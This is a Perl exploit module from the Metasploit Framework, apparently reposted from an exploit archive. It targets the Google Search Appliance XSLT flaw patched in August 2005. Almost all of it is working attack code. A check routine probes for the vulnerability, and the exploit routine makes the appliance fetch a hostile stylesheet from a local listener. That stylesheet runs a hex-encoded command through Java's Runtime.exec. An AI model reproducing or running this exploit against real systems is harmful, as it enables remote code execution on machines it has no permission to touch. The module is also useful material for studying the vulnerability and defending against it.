Google Search Appliance proxystylesheet XSLT Java Code Execution
================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::google_proxystylesheet_exec;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket;
use IO::Select;
my $advanced = { };

my $info =
{
	&#039;Name&#039;           => &#039;Google Appliance ProxyStyleSheet Command Execution&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;        => [ &#039;H D Moore <hdm [at] metasploit.com>&#039; ],
	
	&#039;Description&#039;    => 
		Pex::Text::Freeform(qq{
			This module exploits a feature in the Saxon XSLT parser used by
		the Google Search Appliance. This feature allows for arbitrary
		java methods to be called. Google released a patch and advisory to 
		their client base in August of 2005 (GA-2005-08-m). The target appliance
		must be able to connect back to your machine for this exploit to work.
		}),
		
	&#039;Arch&#039;           => [ ],
	&#039;OS&#039;             => [ ],
	&#039;Priv&#039;           => 0,
	&#039;UserOpts&#039;       => 
		{
			&#039;RHOST&#039;    => [ 1, &#039;HOST&#039;, &#039;The address of the Google appliance&#039;],
			&#039;RPORT&#039;    => [ 1, &#039;PORT&#039;, &#039;The port used by the search interface&#039;, 80],
			&#039;HTTPPORT&#039; => [ 1, &#039;PORT&#039;, &#039;The local HTTP listener port&#039;, 8080      ],
			&#039;HTTPHOST&#039; => [ 0, &#039;HOST&#039;, &#039;The local HTTP listener host&#039;, "0.0.0.0" ],
			&#039;HTTPADDR&#039; => [ 0, &#039;HOST&#039;, &#039;The address that can be used to connect back to this system&#039;],
		},
	&#039;Payload&#039;        => 
		{
			&#039;Space&#039;    => 1024,
			&#039;Keys&#039;     => [ &#039;cmd&#039; ],
		},
	&#039;Refs&#039;           => 
		[
			[&#039;OSVDB&#039;, 20981],
		],
	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
		[
			[ &#039;Google Search Appliance&#039;]
		],
	&#039;Keys&#039;           => [ &#039;google&#039; ],

	&#039;DisclosureDate&#039; => &#039;Aug 16 2005&#039;,
};

sub new
{
	my $class = shift;
	my $self;
	
	$self = $class->SUPER::new(
			{ 
				&#039;Info&#039;     => $info,
				&#039;Advanced&#039; => $advanced,
			},
			@_);

	return $self;
}

sub Check {
	my $self = shift;
	my $s = $self->ConnectSearch;
	
	if (! $s) {
		return $self->CheckCode(&#039;Connect&#039;);
	}
	
	my $url =
		"/search?client=". Pex::Text::AlphaNumText(int(rand(15))+1). "&".
		"site=".Pex::Text::AlphaNumText(int(rand(15))+1)."&".
		"output=xml_no_dtd&".
		"q=".Pex::Text::AlphaNumText(int(rand(15))+1)."&".
		"proxystylesheet=http://".Pex::Text::AlphaNumText(int(rand(32))+1)."/";
	
	$s->Send("GET $url HTTP/1.0\r\n\r\n");
	my $page = $s->Recv(-1, 5);
	$s->Close;

	if ($page =~ /cannot be resolved to an ip address/) {
		$self->PrintLine("[*] This system appears to be vulnerable >:-)");
		return $self->CheckCode(&#039;Confirmed&#039;);
	}
	
	if ($page =~ /ERROR: Unable to fetch the stylesheet/) {
		$self->PrintLine("[*] This system appears to be patched");
	}
	
	$self->PrintLine("[*] This system does not appear to be vulnerable");
	return $self->CheckCode(&#039;Safe&#039;);	
}


sub Exploit
{
	my $self = shift;
	my ($s, $page);
	
	# Request the index page to obtain a redirect response
	$s = $self->ConnectSearch || return;
	$s->Send("GET / HTTP/1.0\r\n\r\n");
	$page = $s->Recv(-1, 5);
	$s->Close;

	# Parse the redirect to get the client and site values
	my ($goog_site, $goog_clnt) = $page =~ m/^location.*site=([^\&]+)\&.*client=([^\&]+)\&/im;
	if (! $goog_site || ! $goog_clnt) {
		$self->PrintLine("[*] Invalid response to our request, is this a Google appliance?");
		#$self->PrintLine($page);
		#!!! return;
		$goog_site = &#039;test&#039;;
		$goog_clnt = &#039;test&#039;;
	}

	# Create the listening local socket that will act as our HTTP server
	my $lis = IO::Socket::INET->new(
			LocalHost => $self->GetVar(&#039;HTTPHOST&#039;),
			LocalPort => $self->GetVar(&#039;HTTPPORT&#039;),
			ReuseAddr => 1,
			Listen    => 1,
			Proto     => &#039;tcp&#039;);
	
	if (not defined($lis)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar(&#039;HTTPPORT&#039;));
		return;
	}
	my $sel = IO::Select->new($lis);
	
	# Send a search request with our own address in the proxystylesheet parameter
	my $query = Pex::Text::AlphaNumText(int(rand(32))+1);
	
	my $proxy =
		"http://".
		($self->GetVar(&#039;HTTPADDR&#039;) || Pex::Utils::SourceIP($self->GetVar(&#039;RHOST&#039;))).
		":".$self->GetVar(&#039;HTTPPORT&#039;)."/".Pex::Text::AlphaNumText(int(rand(15))+1).".xsl";
	
	my $url = 
		"/search?client=". $goog_clnt ."&site=". $goog_site .
		"&output=xml_no_dtd&proxystylesheet=". $proxy .
		"&q=". $query ."&proxyreload=1";

	$self->PrintLine("[*] Sending our malicious search request...");
	$s = $self->ConnectSearch || return;
	$s->Send("GET $url HTTP/1.0\r\n\r\n");
	$page = $s->Recv(-1, 3);
	$s->Close;

	$self->PrintLine("[*] Listening for connections to http://" . $self->GetVar(&#039;HTTPHOST&#039;) . ":" . $self->GetVar(&#039;HTTPPORT&#039;) . " ...");
	
	# Did we receive a connection?
	my @r = $sel->can_read(30);
	
	if (! @r) {
		$self->PrintLine("[*] No connection received from the search engine, possibly patched.");
		$lis->close;
		return;
	}

	my $c = $lis->accept();
	if (! $c) {
		$self->PrintLine("[*] No connection received from the search engine, possibly patched.");
		$lis->close;
		return;	
	}

	my $cli = Msf::Socket::Tcp->new_from_socket($c);
	$self->PrintLine("[*] Connection received from ".$cli->PeerAddr."...");	
	$self->ProcessHTTP($cli);
	return;
}

sub ConnectSearch {
	my $self = shift;
	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $self->GetVar(&#039;RHOST&#039;),
		&#039;PeerPort&#039; => $self->GetVar(&#039;RPORT&#039;),
		&#039;SSL&#039;      => $self->GetVar(&#039;SSL&#039;)
	);
	
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}
	return $s;
}

sub ProcessHTTP
{
	my $self = shift;
	my $cli  = shift;
	my $targetIdx = $self->GetVar(&#039;TARGET&#039;);
	my $target    = $self->Targets->[$targetIdx];
	my $ret       = $target->[1];
	my $shellcode = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $content;
	my $rhost;
	my $rport;

	# Read the first line of the HTTP request
	my ($cmd, $url, $proto) = split(/ /, $cli->RecvLine(10));

	# The way we call Runtime.getRuntime().exec, Java will split
	# our string on whitespace. Since we are injecting via XSLT,
	# inserting quotes becomes a huge pain, so we do this...
	my $exec_str = 
		&#039;/usr/bin/perl -e system(pack(qq{H*},qq{&#039; .
		unpack("H*", $self->GetVar(&#039;EncodedPayload&#039;)->RawPayload).
		&#039;}))&#039;;

	# Load the template from our data section, we have to manually
	# seek and reposition to allow the exploit to be used more
	# than once without a reload.
	seek(DATA, 0, 0);
	while(<DATA>) { last if /^__DATA__$/ }
	while(<DATA>) {	$content .= $_ }

	# Insert our command line
	$content =~ s/:x:MSF:x:/$exec_str/;
	
	# Send it to the requesting appliance
	$rport = $cli->PeerPort;
	$rhost = $cli->PeerAddr;
	$self->PrintLine("[*] HTTP Client connected from $rhost, sending XSLT...");
	
	my $res = "HTTP/1.1 200 OK\r\n" .
	          "Content-Type: text/html\r\n" .
	          "Content-Length: " . length($content) . "\r\n" .
	          "Connection: close\r\n" .
	          "\r\n" .
	          $content;

	$self->PrintLine("[*] Sending ".length($res)." bytes...");
	$cli->Send($res);
	$cli->Close;
}

1;


